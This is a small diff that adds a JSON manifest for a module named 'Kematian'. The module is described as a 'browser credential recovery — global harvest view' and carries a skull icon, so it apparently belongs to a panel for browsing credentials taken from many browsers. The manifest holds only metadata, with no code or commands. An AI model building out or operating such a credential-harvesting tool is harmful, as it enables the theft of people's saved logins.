@@ -1,0 +1,9 @@
+{
+  "name": "Kematian",
+  "version": "1.0.0",
+  "description": "Browser credential recovery — global harvest view",
+  "navbar": {
+    "label": "Kematian",
+    "icon": "fa-skull"
+  }
+}
